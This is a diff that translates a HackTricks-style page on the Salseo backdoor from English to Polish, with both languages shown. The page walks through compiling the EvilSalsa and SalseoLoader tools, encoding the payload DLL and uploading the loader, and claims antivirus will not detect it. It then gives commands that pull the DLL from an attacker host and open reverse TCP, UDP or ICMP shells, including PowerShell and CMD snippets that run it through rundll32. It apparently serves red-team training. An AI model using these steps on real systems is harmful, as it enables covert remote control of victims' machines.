@@ -2,159 +2,142 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Compiling the binaries
+## Kompilowanie binarek
 
-Download the source code from the github and compile **EvilSalsa** and **SalseoLoader**. You will need **Visual Studio** installed to compile the code.
+Pobierz kod źródłowy z githuba i skompiluj **EvilSalsa** oraz **SalseoLoader**. Będziesz potrzebować zainstalowanego **Visual Studio**, aby skompilować kod.
 
-Compile those projects for the architecture of the windows box where your are going to use them(If the Windows supports x64 compile them for that architectures).
+Skompiluj te projekty dla architektury komputera z systemem Windows, na którym zamierzasz ich używać (jeśli Windows obsługuje x64, skompiluj je dla tej architektury).
 
-You can **select the architecture** inside Visual Studio in the **left "Build" Tab** in **"Platform Target".**
+Możesz **wybrać architekturę** w Visual Studio w **lewej zakładce "Build"** w **"Platform Target".**
 
-(\*\*If you can't find this options press in **"Project Tab"** and then in **"\<Project Name> Properties"**)
+(\*\*Jeśli nie możesz znaleźć tych opcji, kliknij w **"Project Tab"** a następnie w **"\<Nazwa Projektu> Properties"**)
 
 ![](<../images/image (132).png>)
 
-Then, build both projects (Build -> Build Solution) (Inside the logs will appear the path of the executable):
+Następnie zbuduj oba projekty (Build -> Build Solution) (W logach pojawi się ścieżka do pliku wykonywalnego):
 
 ![](<../images/image (1) (2) (1) (1) (1).png>)
 
-## Prepare the Backdoor
+## Przygotowanie Backdoora
 
-First of all, you will need to encode the **EvilSalsa.dll.** To do so, you can use the python script **encrypterassembly.py** or you can compile the project **EncrypterAssembly**:
+Przede wszystkim będziesz musiał zakodować **EvilSalsa.dll.** Aby to zrobić, możesz użyć skryptu Pythona **encrypterassembly.py** lub możesz skompilować projekt **EncrypterAssembly**:
 
 ### **Python**
-
 ```
 python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
 python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
 ```
-
 ### Windows
-
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
+Ok, teraz masz wszystko, co potrzebne do wykonania całej operacji Salseo: **zakodowany EvilDalsa.dll** i **plik binarny SalseoLoader.**
 
-Ok, now you have everything you need to execute all the Salseo thing: the **encoded EvilDalsa.dll** and the **binary of SalseoLoader.**
+**Prześlij plik binarny SalseoLoader.exe na maszynę. Nie powinny być wykrywane przez żadne AV...**
 
-**Upload the SalseoLoader.exe binary to the machine. They shouldn't be detected by any AV...**
+## **Wykonaj backdoora**
 
-## **Execute the backdoor**
+### **Uzyskanie odwrotnej powłoki TCP (pobieranie zakodowanego dll przez HTTP)**
 
-### **Getting a TCP reverse shell (downloading encoded dll through HTTP)**
-
-Remember to start a nc as the reverse shell listener and a HTTP server to serve the encoded evilsalsa.
-
+Pamiętaj, aby uruchomić nc jako nasłuchującego powłokę odwrotną oraz serwer HTTP do serwowania zakodowanego evilsalsa.
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
+### **Uzyskiwanie odwrotnej powłoki UDP (pobieranie zakodowanej dll przez SMB)**
 
-### **Getting a UDP reverse shell (downloading encoded dll through SMB)**
-
-Remember to start a nc as the reverse shell listener, and a SMB server to serve the encoded evilsalsa (impacket-smbserver).
-
+Pamiętaj, aby uruchomić nc jako nasłuchującego powłokę odwrotną oraz serwer SMB, aby udostępnić zakodowanego evilsalsa (impacket-smbserver).
 ```
 SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
 ```
+### **Uzyskiwanie odwrotnego powłoki ICMP (zakodowane dll już w ofierze)**
 
-### **Getting a ICMP reverse shell (encoded dll already inside the victim)**
+**Tym razem potrzebujesz specjalnego narzędzia w kliencie, aby odebrać odwrotną powłokę. Pobierz:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
-**This time you need a special tool in the client to receive the reverse shell. Download:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
-
-#### **Disable ICMP Replies:**
-
+#### **Wyłącz odpowiedzi ICMP:**
 ```
 sysctl -w net.ipv4.icmp_echo_ignore_all=1
 
 #You finish, you can enable it again running:
 sysctl -w net.ipv4.icmp_echo_ignore_all=0
 ```
-
-#### Execute the client:
-
+#### Wykonaj klienta:
 ```
 python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
-
-#### Inside the victim, lets execute the salseo thing:
-
+#### Wewnątrz ofiary, wykonajmy rzecz salseo:
 ```
 SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
 ```
+## Kompilowanie SalseoLoader jako DLL eksportującego funkcję główną
 
-## Compiling SalseoLoader as DLL exporting main function
+Otwórz projekt SalseoLoader w Visual Studio.
 
-Open the SalseoLoader project using Visual Studio.
-
-### Add before the main function: \[DllExport]
+### Dodaj przed funkcją główną: \[DllExport]
 
 ![](<../images/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-### Install DllExport for this project
+### Zainstaluj DllExport dla tego projektu
 
-#### **Tools** --> **NuGet Package Manager** --> **Manage NuGet Packages for Solution...**
+#### **Narzędzia** --> **Menedżer pakietów NuGet** --> **Zarządzaj pakietami NuGet dla rozwiązania...**
 
 ![](<../images/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-#### **Search for DllExport package (using Browse tab), and press Install (and accept the popup)**
+#### **Wyszukaj pakiet DllExport (używając zakładki Przeglądaj) i naciśnij Zainstaluj (i zaakceptuj okno popup)**
 
 ![](<../images/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
-In your project folder have appeared the files: **DllExport.bat** and **DllExport_Configure.bat**
+W folderze projektu pojawiły się pliki: **DllExport.bat** i **DllExport_Configure.bat**
 
 ### **U**ninstall DllExport
 
-Press **Uninstall** (yeah, its weird but trust me, it is necessary)
+Naciśnij **Odinstaluj** (tak, to dziwne, ale uwierz mi, to konieczne)
 
 ![](<../images/image (5) (1) (1) (2) (1).png>)
 
-### **Exit Visual Studio and execute DllExport_configure**
+### **Zamknij Visual Studio i uruchom DllExport_configure**
 
-Just **exit** Visual Studio
+Po prostu **zamknij** Visual Studio
 
-Then, go to your **SalseoLoader folder** and **execute DllExport_Configure.bat**
+Następnie przejdź do swojego **folderu SalseoLoader** i **uruchom DllExport_Configure.bat**
 
-Select **x64** (if you are going to use it inside a x64 box, that was my case), select **System.Runtime.InteropServices** (inside **Namespace for DllExport**) and press **Apply**
+Wybierz **x64** (jeśli zamierzasz używać go w środowisku x64, tak było w moim przypadku), wybierz **System.Runtime.InteropServices** (w **Namespace for DllExport**) i naciśnij **Zastosuj**
 
 ![](<../images/image (7) (1) (1) (1) (1).png>)
 
-### **Open the project again with visual Studio**
+### **Otwórz projekt ponownie w Visual Studio**
 
-**\[DllExport]** should not be longer marked as error
+**\[DllExport]** nie powinien być już oznaczony jako błąd
 
 ![](<../images/image (8) (1).png>)
 
-### Build the solution
+### Zbuduj rozwiązanie
 
-Select **Output Type = Class Library** (Project --> SalseoLoader Properties --> Application --> Output type = Class Library)
+Wybierz **Typ wyjścia = Biblioteka klas** (Projekt --> Właściwości SalseoLoader --> Aplikacja --> Typ wyjścia = Biblioteka klas)
 
 ![](<../images/image (10) (1).png>)
 
-Select **x64** **platform** (Project --> SalseoLoader Properties --> Build --> Platform target = x64)
+Wybierz **platformę x64** (Projekt --> Właściwości SalseoLoader --> Kompilacja --> Cel platformy = x64)
 
 ![](<../images/image (9) (1) (1).png>)
 
-To **build** the solution: Build --> Build Solution (Inside the Output console the path of the new DLL will appear)
+Aby **zbudować** rozwiązanie: Buduj --> Zbuduj rozwiązanie (W konsoli wyjściowej pojawi się ścieżka do nowego DLL)
 
-### Test the generated Dll
+### Przetestuj wygenerowane Dll
 
-Copy and paste the Dll where you want to test it.
+Skopiuj i wklej Dll tam, gdzie chcesz go przetestować.
 
-Execute:
-
+Wykonaj:
 ```
 rundll32.exe SalseoLoader.dll,main
 ```
+Jeśli nie pojawi się błąd, prawdopodobnie masz funkcjonalny DLL!!
 
-If no error appears, probably you have a functional DLL!!
+## Uzyskaj powłokę za pomocą DLL
 
-## Get a shell using the DLL
-
-Don't forget to use a **HTTP** **server** and set a **nc** **listener**
+Nie zapomnij użyć **serwera** **HTTP** i ustawić **nasłuchiwacz** **nc**
 
 ### Powershell
-
 ```
 $env:pass="password"
 $env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
@@ -163,9 +146,7 @@ $env:lport="1337"
 $env:shell="reversetcp"
 rundll32.exe SalseoLoader.dll,main
 ```
-
 ### CMD
-
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
@@ -174,5 +155,4 @@ set lport=1337
 set shell=reversetcp
 rundll32.exe SalseoLoader.dll,main
 ```
-
 {{#include ../banners/hacktricks-training.md}}
